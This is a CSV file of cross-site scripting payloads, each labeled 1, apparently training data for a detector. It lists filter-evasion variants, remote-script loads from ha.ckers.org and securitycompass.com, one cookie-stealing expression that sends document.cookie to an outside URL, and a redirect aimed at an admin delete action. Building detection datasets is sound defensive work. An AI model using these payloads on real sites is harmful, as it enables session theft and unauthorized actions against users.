input,label
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,1
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,1
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;,1
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);,1
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,1
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,1
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,1
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;,1
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,1
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;,1
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;,1
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;,1
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;,1
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;,1
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;,1
&lt;HTML xmlns:xss&gt;,1
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,1
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,1
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,1
&lt;HTML&gt;&lt;BODY&gt;,1
&lt;!--[if gte IE 4]&gt;               ,1
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,1
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;,1
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;,1
&lt;? echo(&apos;&lt;SCR)&apos;;,1
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;,1
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,1
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,1
&lt;IMG SRC=`javascript:alert(&quot;RSnake says,1
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,1
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,1
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;,1
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,1
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-,1
\&quot;;alert(&apos;XSS&apos;);//,1
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt;",1
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;,1
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,1
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,1
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,1
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;BODY onload!#$%&amp;()*~+-_.,1
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js,1
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;,1
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,1
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;,1
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;,1
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;,1
&lt;SCRIPT&gt;a=/XSS/,1
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;,1
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;,1
<script>document.vulnerable=true;</script>,1
"<img SRC=""jav ascript:document.vulnerable=true;"">",1
"<img SRC=""javascript:document.vulnerable=true;"">",1
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",1
<body onload!#$%&()*~+-_.,1
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,1
<script <B>document.vulnerable=true;</script>,1
"<img SRC=""javascript:document.vulnerable=true;""",1
"<iframe src=""javascript:document.vulnerable=true; <",1
<script>a=/XSS/\ndocument.vulnerable=true;</script>,1
"\"";document.vulnerable=true;;//",1
</title><SCRIPT>document.vulnerable=true;</script>,1
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",1
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",1
<body ONLOAD=document.vulnerable=true;>,1
"<img DYNSRC=""javascript:document.vulnerable=true;"">",1
"<img LOWSRC=""javascript:document.vulnerable=true;"">",1
"<bgsound SRC=""javascript:document.vulnerable=true;"">",1
"<br SIZE=""&{document.vulnerable=true}"">",1
"<LAYER SRC=""javascript:document.vulnerable=true;""></LAYER>",1
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",1
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",1
<img SRC='vbscript:document.vulnerable=true;'>,1
1script3document.vulnerable=true;1/script3,1
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",1
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",1
"<IFRAME SRC=""javascript:document.vulnerable=true;""></iframe>",1
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",1
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",1
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",1
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",1
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",1
"<div STYLE=""width: expression(document.vulnerable=true);"">",1
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,1
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",1
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",1
"<style TYPE=""text/javascript"">document.vulnerable=true;</style>",1
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",1
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",1
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,1
"<base HREF=""javascript:document.vulnerable=true;//"">",1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>,1
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:document.vulnerable=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>",1
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",1
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",1
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,1
"<meta HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"">",1
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",1
"<a href=""javascript#document.vulnerable=true;"">",1
"<div onmouseover=""document.vulnerable=true;"">",1
"<img src=""javascript:document.vulnerable=true;"">",1
"<img dynsrc=""javascript:document.vulnerable=true;"">",1
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",1
"<bgsound src=""javascript:document.vulnerable=true;"">",1
&<script>document.vulnerable=true;</script>,1
&{document.vulnerable=true;};,1
<img src=&{document.vulnerable=true;};>,1
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",1
"<iframe src=""vbscript:document.vulnerable=true;"">",1
"<img src=""mocha:document.vulnerable=true;"">",1
"<img src=""livescript:document.vulnerable=true;"">",1
"<a href=""about:<script>document.vulnerable=true;</script>"">",1
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",1
"<body onload=""document.vulnerable=true;"">",1
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",1
"<div style=""behaviour: url([link to code]);"">",1
"<div style=""binding: url([link to code]);"">",1
"<div style=""width: expression(document.vulnerable=true;);"">",1
"<style type=""text/javascript"">document.vulnerable=true;</style>",1
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",1
<style><!--</style><script>document.vulnerable=true;//--></script>,1
<<script>document.vulnerable=true;</script>,1
<![<!--]]<script>document.vulnerable=true;//--></script>,1
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,1
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",1
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",1
"<xml src=""javascript:document.vulnerable=true;"">",1
"<xml id=""X""><a><b><script>document.vulnerable=true;</script>;</b></a></xml>",1
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",1
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,1
<style>@import'http://www.securitycompass.com/xss.css';</style>,1
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",1
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",1
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",1
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",1
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",1
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",1
&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,1
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
&lt;/br style=a:expression(alert())&gt;,1
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,1
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;,1
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,1
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out,1
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,1
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",1
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,1
<~/XSS STYLE=xss:expression(alert('XSS'))>,1
"';';;!--"";<;XSS>;=&;{()}",1
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,1
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;,1
"<;BASE HREF="";javascript:alert(';XSS';);//"";>;",1
"<;BGSOUND SRC="";javascript:alert(';XSS';);"";>;",1
"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",1
<;BODY ONLOAD=alert(';XSS';)>;,1
"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",1
"<;DIV STYLE="";background-image: url(&;#1;javascript:alert(';XSS';))"";>;",1
"<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",1
"<;FRAMESET>;<;FRAME SRC="";javascript:alert(';XSS';);"";>;<;/FRAMESET>;",1
"<;IFRAME SRC="";javascript:alert(';XSS';);"";>;<;/IFRAME>;",1
"<;INPUT TYPE="";IMAGE""; SRC="";javascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";javascript:alert(';XSS';);"";>;",1
<;IMG SRC=javascript:alert(';XSS';)>;,1
"<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",1
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"";>;",1
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser,1
"exp/*<;XSS STYLE=';no\xss:noxss("";*//*"";);",1
"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",1
"<;IMG SRC=';vbscript:msgbox("";XSS"";)';>;",1
"<;LAYER SRC="";http://ha.ckers.org/scriptlet.html"";>;<;/LAYER>;",1
"<;IMG SRC="";livescript:[code]"";>;",1
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",1
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64",1
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0; URL=http://;URL=javascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";mocha:[code]"";>;",1
"<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://ha.ckers.org/scriptlet.html"";>;<;/OBJECT>;",1
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;,1
"<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowScriptAccess="";always"";>;<;/EMBED>;",1
"a="";get"";;&;#10;b="";URL("";"";;&;#10;c="";javascript:"";;&;#10;d="";alert(';XSS';);"";)"";;&#10;eval(a+b+c+d);",1
"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",1
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",1
"<;XSS STYLE="";xss:expression(alert(';XSS';))"";>;",1
"<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",1
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",1
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",1
"<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",1
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;,1
"<;META HTTP-EQUIV="";Link""; Content="";<;http://ha.ckers.org/xss.css>;; REL=stylesheet"";>;",1
"<;STYLE>;BODY{-moz-binding:url("";http://ha.ckers.org/xssmoz.xml#xss"";)}<;/STYLE>;",1
"<;TABLE BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TABLE>;",1
"<;TABLE>;<;TD BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TD>;<;/TABLE>;",1
<;HTML xmlns:xss>;,1
"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(';XSS';);"";>;]]>;",1
"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!-- -->;cript:alert(';XSS';)"";>;<;/B>;<;/I>;<;/XML>;",1
"<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",1
<;HTML>;<;BODY>;,1
<;!--[if gte IE 4]>;           ,1
"<;META HTTP-EQUIV="";Set-Cookie""; Content="";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;"";>;",1
"<;XSS STYLE="";behavior: url(http://ha.ckers.org/xss.htc);"";>;",1
"<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",1
"<;!--#exec cmd="";/bin/echo ';<;SCRIPT SRC';"";-->;<;!--#exec cmd="";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';"";-->;",1
<;? echo(';<;SCR)';;,1
"<;BR SIZE="";&;{alert(';XSS';)}"";>;",1
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,1
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;,1
"<;IMG SRC=`javascript:alert("";RSnake says",1
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;,1
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,1
"<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",1
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,1
"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",1
"\"";;alert(';XSS';);//",1
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",1
"<;STYLE>;@im\port';\ja\vasc\ript:alert("";XSS"";)';;<;/STYLE>;",1
"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";jav&;#x0A;ascript:alert(';XSS';);"";>;",1
"<;IMG SRC="";jav&;#x0D;ascript:alert(';XSS';);"";>;",1
"<;IMG&#x0D;SRC&#x0D;=&#x0D;"";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;"";&#x0D;>;&#x0D;",1
"perl -e ';print "";<;IM SRC=java\0script:alert("";XSS"";)>"";;';>; out",1
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",1
"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",1
"<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
<;BODY onload!#$%&;()*~+-_.,1
<;SCRIPT SRC=http://ha.ckers.org/xss.js,1
<;SCRIPT SRC=//ha.ckers.org/.j>;,1
"<;IMG SRC="";javascript:alert(';XSS';)"";",1
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,1
"<;<;SCRIPT>;alert("";XSS"";);//<;<;/SCRIPT>;",1
"<;IMG "";"";"";>;<;SCRIPT>;alert("";XSS"";)<;/SCRIPT>;"";>;",1
<;SCRIPT>;a=/XSS/,1
"<;SCRIPT a="";>;""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
"<;SCRIPT a="";blah""; ';'; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
"<;SCRIPT "";a=';>;';""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
"<;SCRIPT a=`>;` SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
